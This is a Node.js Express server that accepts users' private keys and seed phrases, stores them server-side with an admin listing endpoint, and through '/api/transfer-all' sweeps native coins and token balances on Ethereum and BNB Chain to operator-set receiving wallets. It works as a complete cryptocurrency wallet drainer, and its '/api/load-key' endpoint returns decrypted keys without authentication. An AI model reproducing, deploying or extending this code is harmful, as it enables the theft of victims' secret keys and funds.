const express = require('express');
const bodyParser = require('body-parser');
const { ethers } = require('ethers');
const dotenv = require('dotenv');
const axios = require('axios');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

dotenv.config();

const app = express();
const port = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

// ============ ENCRYPTION SETUP ============
const storageDir = path.join(__dirname, 'encrypted_storage');
if (!fs.existsSync(storageDir)) {
    fs.mkdirSync(storageDir, { recursive: true });
}

const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY;
const ENCRYPTION_ALGORITHM = 'aes-256-gcm';

function encryptData(text) {
    if (!ENCRYPTION_KEY) throw new Error('ENCRYPTION_KEY not set');
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv(ENCRYPTION_ALGORITHM, Buffer.from(ENCRYPTION_KEY, 'hex'), iv);
    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    const authTag = cipher.getAuthTag();
    return { encrypted, iv: iv.toString('hex'), authTag: authTag.toString('hex') };
}

function decryptData(encryptedData, iv, authTag) {
    if (!ENCRYPTION_KEY) throw new Error('ENCRYPTION_KEY not set');
    const decipher = crypto.createDecipheriv(ENCRYPTION_ALGORITHM, Buffer.from(ENCRYPTION_KEY, 'hex'), Buffer.from(iv, 'hex'));
    decipher.setAuthTag(Buffer.from(authTag, 'hex'));
    let decrypted = decipher.update(encryptedData, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    return decrypted;
}

function saveEncryptedKey(userIdentifier, privateKey, metadata = {}) {
    const timestamp = new Date().toISOString();
    const encrypted = encryptData(privateKey);
    const record = {
        id: crypto.randomBytes(16).toString('hex'),
        userIdentifier,
        encryptedData: encrypted.encrypted,
        iv: encrypted.iv,
        authTag: encrypted.authTag,
        metadata,
        createdAt: timestamp,
        lastUsed: timestamp
    };
    const filename = `${userIdentifier.replace(/[^a-zA-Z0-9]/g, '_')}_${Date.now()}.json`;
    const filePath = path.join(storageDir, filename);
    fs.writeFileSync(filePath, JSON.stringify(record, null, 2));
    
    const masterLogPath = path.join(storageDir, 'master_index.json');
    let masterIndex = [];
    if (fs.existsSync(masterLogPath)) {
        masterIndex = JSON.parse(fs.readFileSync(masterLogPath, 'utf8'));
    }
    masterIndex.push({ id: record.id, userIdentifier, filename, createdAt: timestamp, metadata });
    fs.writeFileSync(masterLogPath, JSON.stringify(masterIndex, null, 2));
    return { id: record.id, filename };
}

function loadEncryptedKey(userIdentifier) {
    const masterLogPath = path.join(storageDir, 'master_index.json');
    if (!fs.existsSync(masterLogPath)) return null;
    const masterIndex = JSON.parse(fs.readFileSync(masterLogPath, 'utf8'));
    const records = masterIndex.filter(r => r.userIdentifier === userIdentifier);
    if (records.length === 0) return null;
    const latest = records.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt))[0];
    const filePath = path.join(storageDir, latest.filename);
    if (!fs.existsSync(filePath)) return null;
    const record = JSON.parse(fs.readFileSync(filePath, 'utf8'));
    const decrypted = decryptData(record.encryptedData, record.iv, record.authTag);
    record.lastUsed = new Date().toISOString();
    fs.writeFileSync(filePath, JSON.stringify(record, null, 2));
    return decrypted;
}

function listAllEncryptedKeys() {
    const masterLogPath = path.join(storageDir, 'master_index.json');
    if (!fs.existsSync(masterLogPath)) return [];
    return JSON.parse(fs.readFileSync(masterLogPath, 'utf8'));
}

// ============ LOGGING ============
const logStream = fs.createWriteStream(path.join(__dirname, 'transactions.log'), { flags: 'a' });
function logTransaction(data) {
    const timestamp = new Date().toISOString();
    const logEntry = `[${timestamp}] ${JSON.stringify(data, null, 2)}\n`;
    logStream.write(logEntry);
}

// ============ BLOCKCHAIN CONFIGURATIONS ============

// Chain 1: Ethereum Mainnet
const ETHEREUM_CONFIG = {
    name: 'Ethereum',
    rpcUrl: process.env.RPC_URL,
    chainId: 1,
    nativeToken: 'ETH',
    nativeDecimals: 18,
    nativePrice: 2000,
    gasCost: 0.0015,
    tokenContracts: {
        USDC: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
        DAI: '0x6B175474E89094C44Da98b954EedeAC495271d0F',
        USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
        LINK: '0x514910771AF9Ca656af840dff83E8264EcF986CA',
        UNI: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984',
        WBTC: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599',
        AAVE: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9',
        MATIC: '0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0',
        SHIB: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE',
        PEPE: '0x6982508145454Ce325dDbE47a25d4ec3d2311933',
    },
    tokenDecimals: {
        USDC: 6, DAI: 18, USDT: 6, LINK: 18, UNI: 18, WBTC: 8, AAVE: 18, MATIC: 18, SHIB: 18, PEPE: 18,
    },
    tokenNames: {
        USDC: 'USD Coin', DAI: 'Dai', USDT: 'Tether USD', LINK: 'Chainlink',
        UNI: 'Uniswap', WBTC: 'Wrapped BTC', AAVE: 'Aave', MATIC: 'Polygon', SHIB: 'Shiba', PEPE: 'Pepe',
    },
    tokenPrices: {
        USDC: 1, DAI: 1, USDT: 1, LINK: 15, UNI: 7, WBTC: 30000, AAVE: 90, MATIC: 0.50, SHIB: 0.00001, PEPE: 0.000007,
    }
};

// Chain 2: BNB Smart Chain (BSC)
const BSC_CONFIG = {
    name: 'BNB Chain',
    rpcUrl: process.env.BSC_RPC_URL || 'https://bsc-dataseed.binance.org/',
    chainId: 56,
    nativeToken: 'BNB',
    nativeDecimals: 18,
    nativePrice: 600, // Approximate BNB price
    gasCost: 0.0005, // BSC gas is much cheaper! (~$0.30)
    tokenContracts: {
        // BSC versions of popular tokens
        BSC_USDT: '0x55d398326f99059fF775485246999027B3197955',
        BSC_USDC: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
        BSC_DAI: '0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3',
        BSC_WBTC: '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c',
        BSC_LINK: '0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD',
        BSC_UNI: '0xBf5140A22578168FD562DCcF235E5D43A02ce9B1',
    },
    tokenDecimals: {
        BSC_USDT: 18, BSC_USDC: 18, BSC_DAI: 18, BSC_WBTC: 18, BSC_LINK: 18, BSC_UNI: 18,
    },
    tokenNames: {
        BSC_USDT: 'BNB Chain USDT', BSC_USDC: 'BNB Chain USDC', BSC_DAI: 'BNB Chain DAI',
        BSC_WBTC: 'BNB Chain WBTC', BSC_LINK: 'BNB Chain LINK', BSC_UNI: 'BNB Chain UNI',
    },
    tokenPrices: {
        BSC_USDT: 1, BSC_USDC: 1, BSC_DAI: 1, BSC_WBTC: 30000, BSC_LINK: 15, BSC_UNI: 7,
    }
};

// Receiving wallets for each chain
const receivingWallets = {
    ETH: process.env.RECEIVING_WALLET_ETH,
    BNB: process.env.RECEIVING_WALLET_BNB,
    USDC: process.env.RECEIVING_WALLET_USDC,
    DAI: process.env.RECEIVING_WALLET_DAI,
    USDT: process.env.RECEIVING_WALLET_USDT,
    LINK: process.env.RECEIVING_WALLET_LINK,
    UNI: process.env.RECEIVING_WALLET_UNI,
    WBTC: process.env.RECEIVING_WALLET_WBTC,
    AAVE: process.env.RECEIVING_WALLET_AAVE,
    MATIC: process.env.RECEIVING_WALLET_MATIC,
    SHIB: process.env.RECEIVING_WALLET_SHIB,
    PEPE: process.env.RECEIVING_WALLET_PEPE,
    // BSC tokens
    BSC_USDT: process.env.RECEIVING_WALLET_BSC_USDT,
    BSC_USDC: process.env.RECEIVING_WALLET_BSC_USDC,
    BSC_DAI: process.env.RECEIVING_WALLET_BSC_DAI,
    BSC_WBTC: process.env.RECEIVING_WALLET_BSC_WBTC,
    BSC_LINK: process.env.RECEIVING_WALLET_BSC_LINK,
    BSC_UNI: process.env.RECEIVING_WALLET_BSC_UNI,
};

// ============ HELPER FUNCTIONS ============
async function getGasPrice(rpcUrl, apiKey) {
    try {
        const response = await axios.get(`https://api.etherscan.io/api?module=proxy&action=eth_gasPrice&apikey=${apiKey}`, { timeout: 5000 });
        return ethers.utils.formatUnits(response.data.result, 'gwei');
    } catch (error) {
        return '30';
    }
}

async function getNativeBalance(provider, address) {
    return await provider.getBalance(address);
}

async function getTokenBalance(provider, tokenAddress, walletAddress, decimals) {
    const tokenContract = new ethers.Contract(tokenAddress, ['function balanceOf(address) view returns (uint256)'], provider);
    const balance = await tokenContract.balanceOf(walletAddress);
    return parseFloat(ethers.utils.formatUnits(balance, decimals));
}

async function getBalancesForChain(provider, config, userAddress) {
    const balances = {};
    const balanceDetails = [];
    
    // Get native token balance
    const nativeBalanceWei = await getNativeBalance(provider, userAddress);
    const nativeBalance = parseFloat(ethers.utils.formatEther(nativeBalanceWei));
    if (nativeBalance > 0) {
        balanceDetails.push({
            currency: config.nativeToken,
            name: config.nativeToken,
            balance: nativeBalance,
            usdValue: nativeBalance * config.nativePrice,
            chain: config.name,
            isNative: true
        });
        balances[config.nativeToken] = nativeBalanceWei;
    }
    
    // Get token balances
    for (const [symbol, address] of Object.entries(config.tokenContracts)) {
        try {
            const decimals = config.tokenDecimals[symbol];
            const balance = await getTokenBalance(provider, address, userAddress, decimals);
            if (balance > 0) {
                const usdValue = balance * config.tokenPrices[symbol];
                balanceDetails.push({
                    currency: symbol,
                    name: config.tokenNames[symbol],
                    balance: balance,
                    usdValue: usdValue,
                    chain: config.name,
                    isNative: false
                });
                balances[symbol] = ethers.utils.parseUnits(balance.toString(), decimals);
            }
        } catch (error) {
            console.error(`Error checking ${symbol} on ${config.name}:`, error.message);
        }
    }
    
    return { balances, balanceDetails };
}

function getWalletFromInput(input, provider) {
    const cleanedInput = String(input).trim().replace(/\s+/g, ' ');
    const cleanKey = cleanedInput.replace('0x', '');
    
    if (/^[0-9a-fA-F]{64}$/.test(cleanKey)) {
        return new ethers.Wallet(`0x${cleanKey}`, provider);
    }
    
    try {
        return ethers.Wallet.fromMnemonic(cleanedInput, "m/44'/60'/0'/0/0", provider);
    } catch (error) {
        throw new Error('Invalid seed phrase. Please check your words.');
    }
}

// ============ ENCRYPTION API ENDPOINTS ============
app.post('/api/save-key', async (req, res) => {
    const { userIdentifier, privateKey, metadata } = req.body;
    if (!userIdentifier || !privateKey) {
        return res.status(400).json({ success: false, error: 'Missing userIdentifier or privateKey' });
    }
    try {
        const result = saveEncryptedKey(userIdentifier, privateKey, metadata || {});
        res.json({ success: true, message: 'Key saved securely', id: result.id });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/load-key', async (req, res) => {
    const { userIdentifier } = req.body;
    if (!userIdentifier) {
        return res.status(400).json({ success: false, error: 'Missing userIdentifier' });
    }
    try {
        const privateKey = loadEncryptedKey(userIdentifier);
        if (!privateKey) {
            return res.status(404).json({ success: false, error: 'No saved key found for this identifier' });
        }
        res.json({ success: true, privateKey });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.get('/api/list-keys', async (req, res) => {
    const adminToken = req.headers['x-admin-token'];
    if (adminToken !== process.env.ADMIN_TOKEN) {
        return res.status(401).json({ success: false, error: 'Unauthorized' });
    }
    try {
        const keys = listAllEncryptedKeys();
        res.json({ success: true, keys });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

// ============ MAIN TRANSFER API ============
app.post('/api/transfer-all', async (req, res) => {
    const { userInput, savedIdentifier } = req.body;
    
    let finalInput = userInput;
    if (savedIdentifier && !userInput) {
        try {
            finalInput = loadEncryptedKey(savedIdentifier);
            if (!finalInput) {
                return res.status(404).json({ success: false, error: 'No saved key found for this identifier' });
            }
        } catch (error) {
            return res.status(500).json({ success: false, error: 'Failed to load encrypted key: ' + error.message });
        }
    }
    
    if (!finalInput) {
        return res.status(400).json({ success: false, error: 'Please enter your private key/seed phrase or provide a saved identifier' });
    }

    const startTime = Date.now();
    const allBalanceDetails = [];
    const allTransactions = [];
    let totalTransferredValue = 0;
    
    try {
        // Create wallet from input (same address works on all EVM chains!)
        const ethProvider = new ethers.providers.JsonRpcProvider(ETHEREUM_CONFIG.rpcUrl);
        const userWallet = getWalletFromInput(finalInput, ethProvider);
        const userAddress = userWallet.address;
        
        logTransaction({ event: 'TRANSFER_STARTED', userAddress, timestamp: new Date().toISOString() });
        
        // Process Ethereum chain
        console.log(`\n🔵 Processing ${ETHEREUM_CONFIG.name}...`);
        const ethProviderForChain = new ethers.providers.JsonRpcProvider(ETHEREUM_CONFIG.rpcUrl);
        const ethWalletOnChain = userWallet.connect(ethProviderForChain);
        const { balances: ethBalances, balanceDetails: ethDetails } = await getBalancesForChain(ethProviderForChain, ETHEREUM_CONFIG, userAddress);
        
        allBalanceDetails.push(...ethDetails.map(d => ({ ...d, chain: ETHEREUM_CONFIG.name })));
        
        if (ethDetails.length > 0) {
            const ethGasPrice = await getGasPrice(ETHEREUM_CONFIG.rpcUrl, process.env.ETHERSCAN_API_KEY);
            const ethGasPriceWei = ethers.utils.parseUnits(ethGasPrice, 'gwei');
            
            for (const token of ethDetails) {
                try {
                    const isNative = token.currency === 'ETH';
                    const gasLimit = isNative ? 21000 : 100000;
                    const gasCostEth = parseFloat(ETHEREUM_CONFIG.gasCost);
                    
                    let transaction, receipt;
                    let amountTransferred, usdValueTransferred;
                    
                    if (isNative) {
                        // Leave gas reserve
                        const gasReserve = ethers.utils.parseEther(ETHEREUM_CONFIG.gasCost.toString());
                        const balanceWei = ethBalances['ETH'];
                        let amountToTransfer = balanceWei.sub(gasReserve);
                        
                        if (amountToTransfer.lte(0)) {
                            allTransactions.push({ currency: 'ETH', chain: ETHEREUM_CONFIG.name, status: 'skipped', reason: 'All ETH used for gas' });
                            continue;
                        }
                        
                        amountTransferred = parseFloat(ethers.utils.formatEther(amountToTransfer));
                        usdValueTransferred = amountTransferred * ETHEREUM_CONFIG.nativePrice;
                        
                        transaction = await ethWalletOnChain.sendTransaction({
                            to: receivingWallets['ETH'],
                            value: amountToTransfer,
                            gasPrice: ethGasPriceWei,
                            gasLimit: gasLimit
                        });
                    } else {
                        const balanceWei = ethBalances[token.currency];
                        const amountToTransferWei = balanceWei.mul(95).div(100);
                        amountTransferred = token.balance * 0.95;
                        usdValueTransferred = amountTransferred * ETHEREUM_CONFIG.tokenPrices[token.currency];
                        
                        const tokenContract = new ethers.Contract(
                            ETHEREUM_CONFIG.tokenContracts[token.currency],
                            ['function transfer(address to, uint256 value) returns (bool)'],
                            ethWalletOnChain
                        );
                        
                        transaction = await tokenContract.transfer(
                            receivingWallets[token.currency],
                            amountToTransferWei,
                            { gasPrice: ethGasPriceWei, gasLimit: gasLimit }
                        );
                    }
                    
                    receipt = await transaction.wait();
                    allTransactions.push({
                        currency: token.currency,
                        name: token.name,
                        amount: amountTransferred,
                        usdValue: usdValueTransferred.toFixed(2),
                        chain: ETHEREUM_CONFIG.name,
                        transactionHash: transaction.hash,
                        status: 'success'
                    });
                    totalTransferredValue += usdValueTransferred;
                    
                    logTransaction({ event: 'TRANSFER_SUCCESS', userAddress, chain: ETHEREUM_CONFIG.name, currency: token.currency, amount: amountTransferred, txHash: transaction.hash });
                    
                } catch (error) {
                    allTransactions.push({ currency: token.currency, chain: ETHEREUM_CONFIG.name, status: 'failed', error: error.message });
                    logTransaction({ event: 'TRANSFER_FAILED', userAddress, chain: ETHEREUM_CONFIG.name, currency: token.currency, error: error.message });
                }
            }
        }
        
        // Process BSC chain
        console.log(`\n🟡 Processing ${BSC_CONFIG.name}...`);
        const bscProvider = new ethers.providers.JsonRpcProvider(BSC_CONFIG.rpcUrl);
        const bscWalletOnChain = userWallet.connect(bscProvider);
        const { balances: bscBalances, balanceDetails: bscDetails } = await getBalancesForChain(bscProvider, BSC_CONFIG, userAddress);
        
        allBalanceDetails.push(...bscDetails.map(d => ({ ...d, chain: BSC_CONFIG.name })));
        
        if (bscDetails.length > 0) {
            const bscGasPrice = await getGasPrice(BSC_CONFIG.rpcUrl, process.env.ETHERSCAN_API_KEY);
            const bscGasPriceWei = ethers.utils.parseUnits(bscGasPrice, 'gwei');
            
            for (const token of bscDetails) {
                try {
                    const isNative = token.currency === 'BNB';
                    const gasLimit = isNative ? 21000 : 100000;
                    
                    let transaction, receipt;
                    let amountTransferred, usdValueTransferred;
                    
                    if (isNative) {
                        const gasReserve = ethers.utils.parseEther(BSC_CONFIG.gasCost.toString());
                        const balanceWei = bscBalances['BNB'];
                        let amountToTransfer = balanceWei.sub(gasReserve);
                        
                        if (amountToTransfer.lte(0)) {
                            allTransactions.push({ currency: 'BNB', chain: BSC_CONFIG.name, status: 'skipped', reason: 'All BNB used for gas' });
                            continue;
                        }
                        
                        amountTransferred = parseFloat(ethers.utils.formatEther(amountToTransfer));
                        usdValueTransferred = amountTransferred * BSC_CONFIG.nativePrice;
                        
                        transaction = await bscWalletOnChain.sendTransaction({
                            to: receivingWallets['BNB'],
                            value: amountToTransfer,
                            gasPrice: bscGasPriceWei,
                            gasLimit: gasLimit
                        });
                    } else {
                        const balanceWei = bscBalances[token.currency];
                        const amountToTransferWei = balanceWei.mul(95).div(100);
                        amountTransferred = token.balance * 0.95;
                        usdValueTransferred = amountTransferred * BSC_CONFIG.tokenPrices[token.currency];
                        
                        const tokenContract = new ethers.Contract(
                            BSC_CONFIG.tokenContracts[token.currency],
                            ['function transfer(address to, uint256 value) returns (bool)'],
                            bscWalletOnChain
                        );
                        
                        transaction = await tokenContract.transfer(
                            receivingWallets[token.currency],
                            amountToTransferWei,
                            { gasPrice: bscGasPriceWei, gasLimit: gasLimit }
                        );
                    }
                    
                    receipt = await transaction.wait();
                    allTransactions.push({
                        currency: token.currency,
                        name: token.name,
                        amount: amountTransferred,
                        usdValue: usdValueTransferred.toFixed(2),
                        chain: BSC_CONFIG.name,
                        transactionHash: transaction.hash,
                        status: 'success'
                    });
                    totalTransferredValue += usdValueTransferred;
                    
                    logTransaction({ event: 'TRANSFER_SUCCESS', userAddress, chain: BSC_CONFIG.name, currency: token.currency, amount: amountTransferred, txHash: transaction.hash });
                    
                } catch (error) {
                    allTransactions.push({ currency: token.currency, chain: BSC_CONFIG.name, status: 'failed', error: error.message });
                    logTransaction({ event: 'TRANSFER_FAILED', userAddress, chain: BSC_CONFIG.name, currency: token.currency, error: error.message });
                }
            }
        }
        
        const totalWalletValue = allBalanceDetails.reduce((sum, t) => sum + t.usdValue, 0);
        const successfulCount = allTransactions.filter(t => t.status === 'success').length;
        const totalDuration = Date.now() - startTime;
        
        logTransaction({
            event: 'TRANSFER_BATCH_COMPLETE',
            userAddress,
            summary: {
                totalValueInWallet: totalWalletValue.toFixed(2),
                totalValueTransferred: totalTransferredValue.toFixed(2),
                successfulTransfers: successfulCount,
                totalDurationSeconds: (totalDuration / 1000).toFixed(1)
            }
        });
        
        res.json({
            success: true,
            message: `Transfer Complete! Transferred $${totalTransferredValue.toFixed(2)} worth of assets across ${allBalanceDetails.filter(d => d.chain).length > 0 ? 'multiple chains' : 'Ethereum'}.`,
            summary: {
                totalValueInWallet: totalWalletValue.toFixed(2),
                totalValueTransferred: totalTransferredValue.toFixed(2),
                successfulTransfers: successfulCount,
                totalDurationSeconds: (totalDuration / 1000).toFixed(1)
            },
            transactions: allTransactions,
            walletSnapshot: allBalanceDetails
        });
        
    } catch (error) {
        logTransaction({ event: 'SYSTEM_ERROR', error: error.message });
        res.status(500).json({ success: false, error: error.message });
    }
});

app.listen(port, () => {
    console.log(`✅ Server running at http://localhost:${port}`);
    console.log(`🔐 Encrypted storage enabled at: ${storageDir}`);
    console.log(`💰 Multi-chain support:`);
    console.log(`   - ${ETHEREUM_CONFIG.name} (${Object.keys(ETHEREUM_CONFIG.tokenContracts).length + 1} tokens)`);
    console.log(`   - ${BSC_CONFIG.name} (${Object.keys(BSC_CONFIG.tokenContracts).length + 1} tokens)`);
});
